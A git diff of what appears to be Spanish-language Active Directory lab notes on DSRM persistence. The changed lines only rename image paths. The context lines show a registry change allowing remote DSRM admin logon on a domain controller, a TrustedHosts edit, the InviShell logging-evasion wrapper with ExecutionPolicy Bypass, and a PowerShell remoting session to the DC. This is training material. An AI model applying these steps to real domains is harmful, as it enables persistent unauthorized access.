@@ -64,7 +64,7 @@ We can do this as follows:
 reg add "HKLM\System\CurrentControlSet\Control\Lsa" /v "DsrmAdminLogonBehavior" /t REG_DWORD /d 2 /f
 ```
 
-<figure><img src="../../../.gitbook/assets/image (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 > Modificar el registro del DC para permitir logon remoto con DSRM Admin
 >
@@ -94,7 +94,7 @@ powershell -ExecutionPolicy Bypass
 Set-Item WSMan:\localhost\Client\TrustedHosts 172.16.2.1
 ```
 
-<figure><img src="../../../.gitbook/assets/image (2) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (2) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 > * **Qué hace**: Añade la IP del DC a TrustedHosts → permite WinRM con NTLM (sin Kerberos).
 > * **Por qué IP y no FQDN**: NTLM no resuelve Kerberos → hay que usar IP.
@@ -109,5 +109,5 @@ C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
 Enter-PSSession -ComputerName 172.16.2.1 -Authentication NegotiateWithImplicitCredential
 ```
 
-<figure><img src="../../../.gitbook/assets/image (3) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (3) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
